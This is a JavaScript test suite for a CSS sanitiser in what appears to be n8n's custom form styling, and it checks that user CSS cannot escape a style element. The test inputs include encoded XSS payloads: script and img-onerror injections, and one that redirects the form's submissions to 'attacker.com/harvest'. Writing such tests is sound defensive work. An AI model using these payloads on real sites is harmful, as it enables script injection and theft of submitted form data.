/**
 * Tests for sanitizeCustomCss — ensures custom CSS is sanitized
 * so it cannot break out of the <style> rendering context.
 */

import { sanitizeCustomCss } from '../utils/utils';

describe('sanitizeCustomCss — security', () => {
	describe('entity-encoded markup is neutralized', () => {
		it('should not produce executable tags from encoded input', () => {
			const input =
				'body { color: red; }}&lt;/style&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;style&gt;{';

			const result = sanitizeCustomCss(input);

			expect(result).not.toContain('</style>');
			expect(result).not.toContain('<script>');
			expect(result).not.toContain('</script>');
		});

		it('should not produce img tags from encoded input', () => {
			const input =
				'body { color: blue; }}&lt;/style&gt;&lt;img src=x onerror=alert(document.domain)&gt;&lt;style&gt;{';

			const result = sanitizeCustomCss(input);

			expect(result).not.toContain('</style>');
			expect(result).not.toContain('<img');
		});

		it('should not produce script tags from multi-line encoded input', () => {
			const input = `body { color: red; }
}&lt;/style&gt;&lt;script&gt;document.addEventListener("DOMContentLoaded",function(){var f=document.getElementById("n8n-form");if(f){f.action="https://attacker.com/harvest"}})&lt;/script&gt;&lt;style&gt;{`;

			const result = sanitizeCustomCss(input);

			expect(result).not.toContain('</style>');
			expect(result).not.toContain('<script>');
		});
	});

	describe('mixed safe and encoded content', () => {
		it('should preserve safe CSS child combinator while rejecting encoded markup', () => {
			const input = '#n8n-form > div { color: red; }';
			const result = sanitizeCustomCss(input);

			expect(result).toBe(input);
			expect(result).toContain('>');
		});

		it('should keep safe selectors and strip encoded markup', () => {
			const input = '.container > p { color: red; }&lt;script&gt;alert(1)&lt;/script&gt;';

			const result = sanitizeCustomCss(input);

			expect(result).toContain('.container > p');
			expect(result).not.toContain('<script>');
		});

		it('should handle multiple encoded closing patterns', () => {
			const input =
				'}&lt;/style&gt;&lt;/style&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;style&gt;&lt;style&gt;{';

			const result = sanitizeCustomCss(input);

			expect(result).not.toContain('</style>');
			expect(result).not.toContain('<script>');
		});
	});

	describe('encoded markup inside CSS values', () => {
		it('should not allow encoded markup inside url()', () => {
			const input =
				".bg { background-image: url('}&lt;/style&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;style&gt;{'); }";

			const result = sanitizeCustomCss(input);

			expect(result).not.toContain('</style><script>');
		});

		it('should not allow encoded markup inside data URIs', () => {
			const input =
				"body { background: url('data:image/svg+xml,}&lt;/style&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;style&gt;{'); }";

			const result = sanitizeCustomCss(input);

			expect(result).not.toContain('</style><script>');
		});
	});

	describe('legitimate CSS is preserved', () => {
		it('should preserve CSS with > selectors', () => {
			const input = '#n8n-form > div.form-header > p { text-align: left; }';
			const result = sanitizeCustomCss(input);

			expect(result).toBe(input);
		});

		it('should preserve CSS with & in property values', () => {
			const input = '.class { content: "Q&A"; }';
			const result = sanitizeCustomCss(input);

			expect(result).toContain('Q&A');
		});

		it('should preserve complex CSS with multiple selectors', () => {
			const input = `
				#n8n-form > div.form-header > p { text-align: left; }
				.form-container > .input-group + .input-group { margin-top: 1rem; }
				button:hover { background-color: #0056b3; }
			`;
			const result = sanitizeCustomCss(input);

			expect(result).toBe(input);
		});
	});

	describe('defense in depth', () => {
		it('should strip direct (non-encoded) closing style tags', () => {
			const input = '}</style><div>injected content</div><style>{';

			const result = sanitizeCustomCss(input);

			expect(result).not.toContain('</style>');
		});

		it('should not cascade-decode double-encoded entities', () => {
			const input = 'body{color:red;}&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;';

			const result = sanitizeCustomCss(input);

			expect(result).not.toContain('<script>');
			expect(result).not.toContain('&lt;script');
		});
	});

	describe('output is safe in style rendering context', () => {
		it('should produce safe output when placed inside a style element', () => {
			const input =
				'body{color:red;}&lt;/style&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;style&gt;';

			const sanitized = sanitizeCustomCss(input);

			const rendered = `<style>${sanitized}</style>`;

			expect(rendered).not.toContain('</style><script>');
			expect(rendered).not.toContain('onerror');
		});
	});
});
